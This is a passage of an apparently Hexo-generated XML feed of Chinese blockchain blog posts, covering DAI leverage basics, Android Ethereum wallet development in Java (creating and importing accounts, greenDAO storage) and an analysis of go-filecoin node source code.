为了写这边文章，拓展我不少金融领域知识，以前一直不理解做多做空（因为我不炒股、不炒币），现在把我的理解做一个记录，供参考： 做多做多就是看好其上涨而买入，杠杆做多则是借钱买入。上面就是借DAI（美元）买入以太，借来的6.5万个DAI（美元），按130美元一个以太，可以购买到500个以太，如果一个月后以太涨到200美元， 500个以太就是10万美元，还掉6.5万美元后，相当于凭空赚了3.5万美元。 做空做空就是认为其下跌而卖出，同样也可以借别人的卖出。现在130美元一个以太，我认为以太会下跌到100美元，于是我向交易所借了1000个币卖掉获得13万美元，如果真下跌到100美元，就用10万美元换1000个币还给交易所，这样我凭空赚了3万美元。 参考文章：DAI 白皮书DAI 稳定币的通俗解释 如果你对稳定币感兴趣，我们可以一起交流，我的微信：xlbxiong 备注：稳定币。 加入知识星球，和一群优秀的区块链从业者一起学习。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>稳定币</tag>
        <tag>DAI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发一款以太坊（安卓）钱包系列2 - 导入账号及账号管理]]></title>
    <url>%2F2019%2F03%2F18%2Feth-wallet-dev-2%2F</url>
    <content type="text"><![CDATA[这是如何开发一款以太坊安卓钱包系列第2篇，如何导入账号。有时用户可能已经有一个账号，这篇文章接来介绍下，如何实现导入用户已经存在的账号。 导入账号预备知识从用户需求上来讲，导入用户已经存在的账号是有必要的。 不过从安全性考虑，当你之前使用的是一个非官方、非开源的钱包产品时（尤其是小众钱包），或者之前没有对私钥、助记词、Keysotre文件小心保存时。正确的做法是提示用户： 在新的钱包重新创建一个钱包账号、并安全备份（因为之前的可能已经不安全）； 然后在老钱包里把所有的币转移到新账号。 导入账号有3种方式： 通过私钥导入 通过KeyStore 导入 通过助记词导入 通过私钥导入账号关键是用用户输入的私钥创建一个椭圆曲线秘钥对，然后用这个秘钥对创建钱包，代码如下：（代码在代码库中的app/src/pro/upchain/wallet/utils/ETHWalletUtils.java文件中） 12345public static ETHWallet loadWalletByPrivateKey(String privateKey, String pwd) &#123; Credentials credentials = null; ECKeyPair ecKeyPair = ECKeyPair.create(Numeric.toBigInt(privateKey)); return generateWallet(generateNewWalletName(), pwd, ecKeyPair);&#125; 返回语句中的 generateWallet()，在系列1-通过助记词创建账号 已经介绍过，通过椭圆曲线秘钥对创建钱包。 loadWalletByPrivateKey()中第2个参数密码pwd，在私钥生成账号这个过程并不需要pwd，它是用来加密保存私钥，即为了生成keystore文件。 通过KeyStore文件导入账号关于KeyStore文件，不了解的可以阅读下账号Keystore文件导入导出。 关键步骤： KeyStore 文本内容解析WalletFile实例； 使用密码 解码 WalletFile 生成椭圆曲线秘钥对创建钱包。 12345678910111213141516/** * @param keystore 原json文件内容 * @param pwd keystore解密密码 * @return */public static ETHWallet loadWalletByKeystore(String keystore, String pwd) &#123; try &#123; WalletFile walletFile = null; walletFile = objectMapper.readValue(keystore, WalletFile.class); return generateWallet(generateNewWalletName(), pwd, Wallet.decrypt(pwd, walletFile)); &#125; catch (IOException e) &#123; &#125; catch (CipherException e) &#123; &#125; return null;&#125; 通过助记词导入账号导入和上一篇中，创建非常相似，不同的是，种子由用户提供的助记词生成。 使用助记词导入账号时，还需要用户选择（或输入）一个推倒路径(参考BIP44)，关键步骤是： 通过助记词创建随机数种子； 通过 种子 + 路径 派生生成私钥 创建钱包 ； 12345678910111213141516171819202122232425/** * 通过导入助记词，导入钱包 * * @param path bip44路径 * @param list 助记词 * @param pwd 密码 * @return */public static ETHWallet importMnemonic(String path, String mnemonic, String pwd) &#123; List&lt;String&gt; list = Arrays.asList(mnemonic.split(" "))； if (!path.startsWith("m") &amp;&amp; !path.startsWith("M")) &#123; //参数非法 return null; &#125; String[] pathArray = path.split("/"); if (pathArray.length &lt;= 1) &#123; //内容不对 return null; &#125; String passphrase = ""; long creationTimeSeconds = System.currentTimeMillis() / 1000; DeterministicSeed ds = new DeterministicSeed(list, null, passphrase, creationTimeSeconds); return generateWalletByMnemonic(generateNewWalletName(), ds, pathArray, pwd);&#125; generateWalletByMnemonic在上一篇中已经介绍过， 账号存储（保存到数据库）很多同学肯定已经注意到， 不管通过什么方式构造的账号，都会最终构造为一个ETHWallet 钱包对象，他的定义如下： 1234567891011121314@Entitypublic class ETHWallet &#123; @Id(autoincrement = true) private Long id; public String address; private String name; private String password; // 经过加密后的pwd private String keystorePath; private String mnemonic; private boolean isCurrent; // 是否是当前选中的钱包 private boolean isBackup; // 是否备份过&#125; 前面构造的ETHWallet是只存在于内容之中， 在应用程序退出之后，这个数据将丢失， 因此我们需要把它序列化到序列化数据库中存储起来，在下一次进入应用的时候加载数据库还原出账号。 greenDAOgreenDAO 是一个将对象映射到 SQLite 数据库中的轻量且快速的 ORM 解决方案，以下是一个greenDAO的作用示意图： 这里我们也使用了 greenDAO 来把ETHWallet对象映射到 SQLite 数据库， greenDAO的用法这里只简单说明，不详细阐述，大家可以跟随官方提供的introduction 和 how-to-get-started。 对象映射保存把ETHWallet映射的到数据库，需要给类加上@Entity注解，这样greenDAO会生成几个类：DaoMaster、DaoSession及 ETHWalletDao 帮我们完成构建数据库表等操作。 在使用ETHWalletDao插入到数据库之前需要先进行一个初始化，通常初始化放在应用程序入口中进行，如：pro.upchain.wallet.UpChainWalletApp的onCreate()中执行，初始化代码如下： 123456protected void init() &#123; DaoMaster.DevOpenHelper mHelper = new DaoMaster.DevOpenHelper(this, "wallet", null); SQLiteDatabase db = mHelper.getWritableDatabase(); DaoSession daoSession = new DaoMaster(db).newSession(); ETHWalletDao ethWalletDao = daoSession.getETHWalletDao();&#125; 有了greenDAO为我们生成的辅助类，插入到数据库就很简单了，一行代码： 1ethWalletDao.insert(ethWallet); // ethWallet为ETHWallet实例， 前面不管是新创建还是导入的账号都会构造这样一个实例。 多账号管理考虑到用户可能会创建多个账号，因此需要确定一个当前选定的账号，一般情况下，用户新创建的账号应该作为当前选中的的账号，同时其他账号应该取消选中， 我们完善下账号存储逻辑， 如下：（代码在代码库中的app/src/pro/upchain/wallet/utils/WalletDaoUtils.java文件中） WalletDaoUtils.java123456789101112131415161718192021222324252627282930313233/** * 插入新创建钱包 * * @param ethWallet 钱 */public static void insertNewWallet(ETHWallet ethWallet) &#123; updateCurrent(-1); // 取消其他站账号选中状态 ethWallet.setCurrent(true); ethWalletDao.insert(ethWallet);&#125;/** * 更新选中钱包 * * @param id 钱包ID */public static ETHWallet updateCurrent(long id) &#123;// 加载所有钱包账号 List&lt;ETHWallet&gt; ethWallets = ethWalletDao.loadAll(); ETHWallet currentWallet = null; for (ETHWallet ethwallet : ethWallets) &#123; if (id != -1 &amp;&amp; ethwallet.getId() == id) &#123; ethwallet.setCurrent(true); currentWallet = ethwallet; &#125; else &#123; ethwallet.setCurrent(false); &#125; ethWalletDao.update(ethwallet); &#125; return currentWallet;&#125; 打通账号创建与保存以通过私钥导入账号进行保存为例，把创建账号和保存账号打通，这里我们使用响应式编程 ReactiveX，这部分作为订阅者福利，发表在我的小专栏，趁还未涨价，赶紧订阅吧，超值的！ 下一篇 将继续介绍资产的显示。 学习资料 RxAndroid 了解更多响应式编程 introduction 和 how-to-get-started 了解greenDAO。 我创建了一个专门讨论钱包开发的微信群，加微信：xlbxiong 备注：钱包。 加入知识星球，和一群优秀的区块链从业者一起学习。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>以太坊</category>
        <category>钱包</category>
      </categories>
      <tags>
        <tag>钱包</tag>
        <tag>Web3j</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发一款以太坊（安卓）钱包系列1 - 通过助记词创建账号]]></title>
    <url>%2F2019%2F03%2F13%2Feth_wallet_dev_1%2F</url>
    <content type="text"><![CDATA[上周我们开源了登链钱包，反映很好，一周时间不到已经快到100 Star。接下来我会写把钱包核心要点写出来作为一个以太坊钱包开发系列文章，对代码进行一个解读。 写在前面本钱包是基于Android安卓平台开发，使用的是原生语言 Java 编写， 是基于Java 1.8 版本，其中使用了Java 1.8 中一些较新的语言特性，如 Lambda表达式等；另外还较多使用了ReactiveX/RxAndroid响应式编程用法。 在本系列文章中，重点是介绍以太坊钱包账号、交易等逻辑，有时可能会假定读者已经了解以太坊及Android开发等相关知识，因为这些内容不是文章的重点，因此不会过多介绍，请海涵。 钱包包含的功能通常一个钱包会包含以下功能： 支持通过生成助记词、Keystore文件、私钥 创建钱包账号。 支持导出钱包账号助记词、私钥、Keystore文件。 支持多个钱包账号管理 账户余额查询及转账功能（二维码扫描支持）。 支持ERC20 代币（余额显示、转账、代币币价显示） 支持用法币（美元和人民币）实时显示币价。 历史交易列表显示 创建账号预备知识我们先来介绍第一个功能：通过生成助记词、Keystore文件、私钥创建钱包账号。本系列中，钱包都是指分层确定性钱包，（HD钱包 Hierarchical Deterministic Wallets）， 之前博客有一篇文章分层钱包进行了详细的介绍，还不熟悉的可以读一下。为了保持本文的完整，这里做一个总结性回顾：以太坊及比特币的地址是由随机生成的私钥经过椭圆曲线等算法单向推倒而来 ，BIP32及BIP44是为方便管理私钥提出的分层推倒方案，BIP39 定义助记词让分层种子的备份更方便。而KeyStore文件是用来解密以太坊保存私钥的一种方式，大家可以阅读下这篇文章: 账号Keystore文件导入导出了解更多。 实现完成的，界面如下图： 这是一张导入钱包账号的截图（导入和创建，其实原理一样），界面仿照ImToken，不过本文将不会介绍UI部分的编写。 Web3j &amp; bitcoinj为了完成创建账号功能，我们需要使用到两个库：Web3j 和 bitcoinj Web3是一套和以太坊通信的封装库，Web3j是Java版本的实现，例如发起交易和智能合约进行交互，下图很好的表达了其作用。 不过本文中的功能，主要是使用了web3j中椭圆曲线加密及KeyStore文件的生成与解密。 bitcoinj 的功能和web3类似，它是比特币协议的Java实现，他实现了 BIP32、BIP44及BIP39 相关协议。 Android使用Gradle来构建，直接在app/build.gradle文件中加入： 12implementation &apos;org.web3j:core:4.1.0-android&apos;implementation &apos;org.bitcoinj:bitcoinj-core:0.14.7&apos; 提示： 实践中遇到的一个问题，由于bitcoinj 中引入了 com.lambdaworks:scrypt加密库， 它包含的lib/x86_64/darwin/libscrypt.dylib文件，会导致在进行Android App Bundle 编译时会出现错误（好像也会导致某些机型没法安装），解决办法是在 build.gradle 加入一下语句，把这个文件在打包时排除掉。packagingOptions { exclude ‘lib/x86_64/darwin/libscrypt.dylib’} 创建账号实现通过助记词常见钱包账号这是目前钱包客户端，最常见的一种为用户常见账号的方式，这里会包含一下几个核心步骤： 生成一个随机数种子； 通过随机数种子得到助记词； 通过 种子 + 路径 派生生成私钥； 使用KeyStore保存私钥； 私钥推倒出账号地址。 大家可以在再次阅读分层钱包，理解为何这么做的原因。 理解了上面几点，那么代码就容易明白了，代码在代码库中的app/src/pro/upchain/wallet/utils/ETHWalletUtils.java中，关键代码逻辑如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091// 创建钱包对象入口函数public static ETHWallet generateMnemonic(String walletName, String pwd) &#123; String[] pathArray = "m/44'/60'/0'/0/0".split("/"); long creationTimeSeconds = System.currentTimeMillis() / 1000; SecureRandom secureRandom = SecureRandomUtils.secureRandom(); DeterministicSeed ds = new DeterministicSeed(secureRandom, 128, "", creationTimeSeconds); return generateWalletByMnemonic(walletName, ds, pathArray, pwd);&#125;/** * @param walletName 钱包名称 * @param ds 助记词加密种子 * @param pathArray 助记词标准 * @param pwd 密码 * @return */@Nullablepublic static ETHWallet generateWalletByMnemonic(String walletName, DeterministicSeed ds, String[] pathArray, String pwd) &#123; //种子 byte[] seedBytes = ds.getSeedBytes(); //助记词 List&lt;String&gt; mnemonic = ds.getMnemonicCode(); if (seedBytes == null) return null; // 衍生推倒key DeterministicKey dkKey = HDKeyDerivation.createMasterPrivateKey(seedBytes); for (int i = 1; i &lt; pathArray.length; i++) &#123; ChildNumber childNumber; if (pathArray[i].endsWith("'")) &#123; int number = Integer.parseInt(pathArray[i].substring(0, pathArray[i].length() - 1)); childNumber = new ChildNumber(number, true); &#125; else &#123; int number = Integer.parseInt(pathArray[i]); childNumber = new ChildNumber(number, false); &#125; dkKey = HDKeyDerivation.deriveChildKey(dkKey, childNumber); &#125; ECKeyPair keyPair = ECKeyPair.create(dkKey.getPrivKeyBytes()); ETHWallet ethWallet = generateWallet(walletName, pwd, keyPair); if (ethWallet != null) &#123; ethWallet.setMnemonic(convertMnemonicList(mnemonic)); &#125; return ethWallet;&#125;// 通过椭圆曲线秘钥对创建钱包 @Nullableprivate static ETHWallet generateWallet(String walletName, String pwd, ECKeyPair ecKeyPair) &#123; WalletFile keyStoreFile; try &#123; //最后两个参数： n 是 CPU/Memory 开销值，越高的开销值，计算就越困难。r 表示块大小，p 表示并行度 keyStoreFile = Wallet.create(pwd, ecKeyPair, 1024, 1); // WalletUtils. .generateNewWalletFile(); &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; BigInteger publicKey = ecKeyPair.getPublicKey(); String s = publicKey.toString(); String wallet_dir = AppFilePath.Wallet_DIR; String keystorePath = "keystore_" + walletName + ".json"; File destination = new File(wallet_dir, "keystore_" + walletName + ".json"); //目录不存在则创建目录，创建不了则报错 if (!createParentDir(destination)) &#123; return null; &#125; try &#123; objectMapper.writeValue(destination, keyStoreFile); &#125; catch (IOException e) &#123; e.printStackTrace(); return null; &#125; ETHWallet ethWallet = new ETHWallet(); ethWallet.setName(walletName); ethWallet.setAddress(Keys.toChecksumAddress(keyStoreFile.getAddress())); ethWallet.setKeystorePath(destination.getAbsolutePath()); ethWallet.setPassword(Md5Utils.md5(pwd)); return ethWallet;&#125; 上述代码中，generateMnemonic()是入口函数，最终返回的是一个ETHWallet 自定义的钱包实体类，一个实例就对应一个钱包，ETHWallet保存了钱包相关的属性，后面会详细介绍，如果对它序列化保存钱包账号及多个钱包账号管理。 几个注意事项关于助记词及私钥的保存，有几点要特别注意，否则有可能和其他钱包无法兼容或导致私钥泄漏。 这部分作为订阅者福利，发表在我的小专栏，趁还未涨价，赶紧订阅吧，超值的！ 参考文档 web3j API 文档 web3j GitHub bitcoinj 介绍及文档 我创建了一个专门讨论钱包开发的微信群，加微信：xlbxiong 备注：钱包。 加入最专业的区块链问答社区，和一群优秀的区块链从业者一起学习。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>以太坊</category>
        <category>钱包</category>
      </categories>
      <tags>
        <tag>以太坊</tag>
        <tag>Web3j</tag>
        <tag>HD钱包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析系列文章 - 目录]]></title>
    <url>%2F2019%2F03%2F11%2Ffilecoin-code-analysis-0%2F</url>
    <content type="text"><![CDATA[我是杨尉，先河系统CTO，欢迎大加关注的的Github: waynewyang，因为工作需要，在FileCoin开源后，从源码层对filecoin的架构进行了一下分析，整理了一些文章，希望对大家有所帮助。 目录 1 filecoin概念 2 filecoin通用语言理解 3 filecoin开发网使用 4 filecoin源码顶层架构分析 5 filecoin源码协议层分析之心跳协议 6 filecoin源码协议层分析之hello握手协议 7 filecoin源码协议层分析之存储协议 8 filecoin源码协议层分析之检索协议 9 filecoin源码分析之支撑包分析(1) 10 filecoin源码分析之支撑包分析(2/2) 11 filecoin源码分析之内部接口层api包分析 12 filecoin源码分析之内部接口层plumbing＆porcelain接口 13 filecoin源码分析之服务层actor及vm 14 filecoin源码分析之服务层链同步、共识协议及挖矿 15 filecoin源码分析之节点运行逻辑]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析之十五：filecoin源码分析之节点运行逻辑]]></title>
    <url>%2F2019%2F03%2F10%2Ffilecoin-code-analysis-15%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第十五章源码分析之节点运行逻辑。 分析基于的源码版本：go-filecoin master a0598a54(2019年3月9日) 前提 我们在前面的章节已经经过了三个阶段的梳理分析 概念阶段，包括概念、通用语言理解、开发网络使用 顶层架构与概念的结合理解 具体源码的简析，包括协议层、支撑包、内部api层、服务层 源码部分的command部分比较容易理解，就不单独文章赘述了，基本与内部api层都可以对应起来 现在再来看节点的运行逻辑应该会更加清晰了 filecoin节点运行逻辑简析基本数据结构123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164▼ package node▶ imports▼ variables +ErrNoMinerAddress -filecoinDHTProtocol : dhtprotocol.ID -log // 创建具体的filecoin节点实例▼+Config : struct [fields] // 设置区块时间 +BlockTime : time.Duration // 配置节点是否转发 +IsRelay : bool // libp2p选项 +Libp2pOpts : []libp2p.Option // 在离线模式下，会关闭libp2p +OfflineMode : bool // 配置资源 +Repo : repo.Repo // 配置区块奖励方法 +Rewarder : consensus.BlockRewarder // 配置节点时空证明校验函数 +Verifier : proofs.Verifier [methods] // 创建node实例 +Build(ctx context.Context) : *Node, error -buildHost(ctx context.Context, makeDHT func(host host.Host) routing.IpfsRouting, error) : host.Host, error +ConfigOpt : func(*Config) error▼+Node : struct [fields] // 确认最新区块，本地持久化并广播 +AddNewlyMinedBlock : newBlockFunc // 订阅主题&quot;/fil/blocks&quot; +BlockSub : pubsub.Subscription // 块服务接口 +Blockstore : bstore.Blockstore // 维持相关节点连接 +Bootstrapper : *net.Bootstrapper // 读取区块信息 +ChainReader : chain.ReadStore // 同时协议 +Consensus : consensus.Protocol // 块交换,节点间的数据交换 +Exchange : exchange.Interface // new-head 主题 +HeaviestTipSetCh : chan interface&#123;&#125; // 新区块处理请求 +HeaviestTipSetHandled : func() // hello服务 +HelloSvc : *hello.Handler // 消息订阅 +MessageSub : pubsub.Subscription // 挖矿调度 +MiningScheduler : mining.Scheduler // 消息池操作 +MsgPool : *core.MessagePool // 离线模式 +OfflineMode : bool +OnlineStore : *hamt.CborIpldStore // 对应libp2p中的host +PeerHost : host.Host // libp2p中的ping service +Ping : *ping.PingService // 高层api +PorcelainAPI : *porcelain.API // 功率表 +PowerTable : consensus.PowerTableView // 配置资源 +Repo : repo.Repo // 检索客户端 +RetrievalClient : *retrieval.Client // 检索矿工 +RetrievalMiner : *retrieval.Miner // 路由,libp2p +Router : routing.IpfsRouting // 存储矿工 +StorageMiner : *storage.Miner // 存储客户 +StorageMinerClient : *storage.Client // 链同步 +Syncer : chain.Syncer // 钱包管理 +Wallet : *wallet.Wallet -blockTime : time.Duration -blockservice : bserv.BlockService -cancelMining : context.CancelFunc -cancelSubscriptionsCtx : context.CancelFunc -cborStore : *hamt.CborIpldStore -host : host.Host -lookup : lookup.PeerLookupService -mining -miningCtx : context.Context -miningDoneWg : *sync.WaitGroup -sectorBuilder : sectorbuilder.SectorBuilder [methods] +BlockHeight() : *types.BlockHeight, error +BlockService() : bserv.BlockService +CborStore() : *hamt.CborIpldStore +ChainReadStore() : chain.ReadStore // 创建矿工方法 +CreateMiner(ctx context.Context, accountAddr address.Address, gasPrice types.AttoFIL, gasLimit types.GasUnits, pledge uint64, pid libp2ppeer.ID, collateral *types.AttoFIL) : *address.Address, error +GetBlockTime() : time.Duration +Host() : host.Host // 节点查找方法 +Lookup() : lookup.PeerLookupService +MiningSignerAddress() : address.Address +MiningTimes() : time.Duration, time.Duration // 创建新的account地址，钱包地址 +NewAddress() : address.Address, error +SectorBuilder() : sectorbuilder.SectorBuilder +SetBlockTime(blockTime time.Duration) // 启动节点 +Start(ctx context.Context) : error // 启动挖矿 +StartMining(ctx context.Context) : error // 停止节点 +Stop(ctx context.Context) // 停止挖矿 +StopMining(ctx context.Context) -addNewlyMinedBlock(ctx context.Context, b *types.Block) -cancelSubscriptions() -getLastUsedSectorID(ctx context.Context, minerAddr address.Address) : uint64, error -getMinerActorPubKey() : []byte, error -handleNewHeaviestTipSet(ctx context.Context, head types.TipSet) -handleNewMiningOutput(miningOutCh chan mining.Output) -handleSubscription(ctx context.Context, f pubSubProcessorFunc, fname string, s pubsub.Subscription, sname string) -isMining() : bool -miningAddress() : address.Address, error -miningOwnerAddress(ctx context.Context, miningAddr address.Address) : address.Address, error -saveMinerConfig(minerAddr address.Address, signerAddr address.Address) : error -setIsMining(isMining bool) -setupHeartbeatServices(ctx context.Context) : error -setupMining(ctx context.Context) : error [functions] // 调用Build创建node实例 +New(ctx context.Context, opts ...ConfigOpt) : *Node, error▼-blankValidator : struct [methods] +Select(_ string, _ [][]byte) : int, error +Validate(_ string, _ []byte) : error -newBlockFunc : func(context.Context, *types.Block) -pubSubProcessorFunc : func(ctx context.Context, msg pubsub.Message) error▼ functions +BlockTime(blockTime time.Duration) : ConfigOpt +IsRelay() : ConfigOpt +Libp2pOptions(opts ...libp2p.Option) : ConfigOpt +OfflineMode(offlineMode bool) : ConfigOpt +RewarderConfigOption(rewarder consensus.BlockRewarder) : ConfigOpt +StartMining(ctx context.Context, node *Node) : error +VerifierConfigOption(verifier proofs.Verifier) : ConfigOpt -initSectorBuilderForNode(ctx context.Context, node *Node, sectorStoreType proofs.SectorStoreType) : sectorbuilder.SectorBuilder, error -initStorageMinerForNode(ctx context.Context, node *Node) : *storage.Miner, error -readGenesisCid(ds datastore.Datastore) : cid.Cid, error 创建filecoin节点实例 实例化filecoin节点,简析见如下添加的注释 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173// Build instantiates a filecoin Node from the settings specified in the config.func (nc *Config) Build(ctx context.Context) (*Node, error) &#123; // 创建内存资源实例 if nc.Repo == nil &#123; nc.Repo = repo.NewInMemoryRepo() &#125; // 创建块服务实例 bs := bstore.NewBlockstore(nc.Repo.Datastore()) validator := blankValidator&#123;&#125; var peerHost host.Host var router routing.IpfsRouting // 带宽统计实例,加入libp2popts bandwidthTracker := p2pmetrics.NewBandwidthCounter() nc.Libp2pOpts = append(nc.Libp2pOpts, libp2p.BandwidthReporter(bandwidthTracker)) // 非离线模式才启用libp2p if !nc.OfflineMode &#123; makeDHT := func(h host.Host) (routing.IpfsRouting, error) &#123; r, err := dht.New( ctx, h, dhtopts.Datastore(nc.Repo.Datastore()), dhtopts.NamespacedValidator(&quot;v&quot;, validator), dhtopts.Protocols(filecoinDHTProtocol), ) if err != nil &#123; return nil, errors.Wrap(err, &quot;failed to setup routing&quot;) &#125; router = r return r, err &#125; var err error // 实例化非离线模式libp2p host peerHost, err = nc.buildHost(ctx, makeDHT) if err != nil &#123; return nil, err &#125; &#125; else &#123; // 离线模式处理 router = offroute.NewOfflineRouter(nc.Repo.Datastore(), validator) peerHost = rhost.Wrap(noopLibP2PHost&#123;&#125;, router) &#125; // ping服务实例 // set up pinger pinger := ping.NewPingService(peerHost) // bitswap实例 // set up bitswap nwork := bsnet.NewFromIpfsHost(peerHost, router) //nwork := bsnet.NewFromIpfsHost(innerHost, router) bswap := bitswap.New(ctx, nwork, bs) bservice := bserv.New(bs, bswap) cstOnline := hamt.CborIpldStore&#123;Blocks: bservice&#125; cstOffline := hamt.CborIpldStore&#123;Blocks: bserv.New(bs, offline.Exchange(bs))&#125; // 获取创世块cid genCid, err := readGenesisCid(nc.Repo.Datastore()) if err != nil &#123; return nil, err &#125; // chain.Store实例以及功率表 var chainStore chain.Store = chain.NewDefaultStore(nc.Repo.ChainDatastore(), &amp;cstOffline, genCid) powerTable := &amp;consensus.MarketView&#123;&#125; // 共识协议processor实例 var processor consensus.Processor if nc.Rewarder == nil &#123; processor = consensus.NewDefaultProcessor() &#125; else &#123; processor = consensus.NewConfiguredProcessor(consensus.NewDefaultMessageValidator(), nc.Rewarder) &#125; // 共识协议实例 var nodeConsensus consensus.Protocol if nc.Verifier == nil &#123; nodeConsensus = consensus.NewExpected(&amp;cstOffline, bs, processor, powerTable, genCid, &amp;proofs.RustVerifier&#123;&#125;) &#125; else &#123; nodeConsensus = consensus.NewExpected(&amp;cstOffline, bs, processor, powerTable, genCid, nc.Verifier) &#125; // 链同步，链读取，消息池实例 // only the syncer gets the storage which is online connected chainSyncer := chain.NewDefaultSyncer(&amp;cstOnline, &amp;cstOffline, nodeConsensus, chainStore) chainReader, ok := chainStore.(chain.ReadStore) if !ok &#123; return nil, errors.New(&quot;failed to cast chain.Store to chain.ReadStore&quot;) &#125; msgPool := core.NewMessagePool() // Set up libp2p pubsub fsub, err := libp2pps.NewFloodSub(ctx, peerHost) if err != nil &#123; return nil, errors.Wrap(err, &quot;failed to set up pubsub&quot;) &#125; // 钱包服务实例 backend, err := wallet.NewDSBackend(nc.Repo.WalletDatastore()) if err != nil &#123; return nil, errors.Wrap(err, &quot;failed to set up wallet backend&quot;) &#125; fcWallet := wallet.New(backend) // 实例化高层api PorcelainAPI := porcelain.New(plumbing.New(&amp;plumbing.APIDeps&#123; Chain: chainReader, Config: cfg.NewConfig(nc.Repo), Deals: strgdls.New(nc.Repo.DealsDatastore()), MsgPool: msgPool, MsgPreviewer: msg.NewPreviewer(fcWallet, chainReader, &amp;cstOffline, bs), MsgQueryer: msg.NewQueryer(nc.Repo, fcWallet, chainReader, &amp;cstOffline, bs), MsgSender: msg.NewSender(fcWallet, chainReader, msgPool, consensus.NewOutboundMessageValidator(), fsub.Publish), MsgWaiter: msg.NewWaiter(chainReader, bs, &amp;cstOffline), Network: net.New(peerHost, pubsub.NewPublisher(fsub), pubsub.NewSubscriber(fsub), net.NewRouter(router), bandwidthTracker), SigGetter: mthdsig.NewGetter(chainReader), Wallet: fcWallet, &#125;)) // 实例化node nd := &amp;Node&#123; blockservice: bservice, Blockstore: bs, cborStore: &amp;cstOffline, OnlineStore: &amp;cstOnline, Consensus: nodeConsensus, ChainReader: chainReader, Syncer: chainSyncer, PowerTable: powerTable, PorcelainAPI: PorcelainAPI, Exchange: bswap, host: peerHost, MsgPool: msgPool, OfflineMode: nc.OfflineMode, PeerHost: peerHost, Ping: pinger, Repo: nc.Repo, Wallet: fcWallet, blockTime: nc.BlockTime, Router: router, &#125; // Bootstrapping network peers. periodStr := nd.Repo.Config().Bootstrap.Period period, err := time.ParseDuration(periodStr) if err != nil &#123; return nil, errors.Wrapf(err, &quot;couldn&apos;t parse bootstrap period %s&quot;, periodStr) &#125; // 实例化Bootstrapper,指定node的该方法 // Bootstrapper maintains connections to some subset of addresses ba := nd.Repo.Config().Bootstrap.Addresses bpi, err := net.PeerAddrsToPeerInfos(ba) if err != nil &#123; return nil, errors.Wrapf(err, &quot;couldn&apos;t parse bootstrap addresses [%s]&quot;, ba) &#125; minPeerThreshold := nd.Repo.Config().Bootstrap.MinPeerThreshold nd.Bootstrapper = net.NewBootstrapper(bpi, nd.Host(), nd.Host().Network(), nd.Router, minPeerThreshold, period) // 实例化链查找服务，指定node的该方法 // On-chain lookup service defaultAddressGetter := func() (address.Address, error) &#123; return nd.PorcelainAPI.GetAndMaybeSetDefaultSenderAddress() &#125; nd.lookup = lookup.NewChainLookupService(nd.ChainReader, defaultAddressGetter, bs) return nd, nil&#125; 启动及停止filecoin节点 启动filecoin节点的流程概览 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182// Start boots up the node.func (node *Node) Start(ctx context.Context) error &#123; // 加载本地chain信息 if err := node.ChainReader.Load(ctx); err != nil &#123; return err &#125; // 如果存在存储矿工，配置挖矿功能 // Only set these up if there is a miner configured. if _, err := node.miningAddress(); err == nil &#123; if err := node.setupMining(ctx); err != nil &#123; log.Errorf(&quot;setup mining failed: %v&quot;, err) return err &#125; &#125; // 设置链同步回调函数 // Start up &apos;hello&apos; handshake service syncCallBack := func(pid libp2ppeer.ID, cids []cid.Cid, height uint64) &#123; // TODO it is possible the syncer interface should be modified to // make use of the additional context not used here (from addr + height). // To keep things simple for now this info is not used. err := node.Syncer.HandleNewBlocks(context.Background(), cids) if err != nil &#123; log.Infof(&quot;error handling blocks: %s&quot;, types.NewSortedCidSet(cids...).String()) &#125; &#125; // 实例化hello握手协议 node.HelloSvc = hello.New(node.Host(), node.ChainReader.GenesisCid(), syncCallBack, node.ChainReader.Head) // 实例化存储矿工协议 cni := storage.NewClientNodeImpl(dag.NewDAGService(node.BlockService()), node.Host(), node.GetBlockTime()) var err error node.StorageMinerClient, err = storage.NewClient(cni, node.PorcelainAPI) if err != nil &#123; return errors.Wrap(err, &quot;Could not make new storage client&quot;) &#125; // 实例化检索客户及检索矿工协议 node.RetrievalClient = retrieval.NewClient(node) node.RetrievalMiner = retrieval.NewMiner(node) // 订阅区块通知 // subscribe to block notifications blkSub, err := node.PorcelainAPI.PubSubSubscribe(BlockTopic) if err != nil &#123; return errors.Wrap(err, &quot;failed to subscribe to blocks topic&quot;) &#125; node.BlockSub = blkSub // 订阅消息通知 // subscribe to message notifications msgSub, err := node.PorcelainAPI.PubSubSubscribe(msg.Topic) if err != nil &#123; return errors.Wrap(err, &quot;failed to subscribe to message topic&quot;) &#125; node.MessageSub = msgSub cctx, cancel := context.WithCancel(context.Background()) node.cancelSubscriptionsCtx = cancel // 启用新线程订阅区块及消息主题,设置handle回调 go node.handleSubscription(cctx, node.processBlock, &quot;processBlock&quot;, node.BlockSub, &quot;BlockSub&quot;) go node.handleSubscription(cctx, node.processMessage, 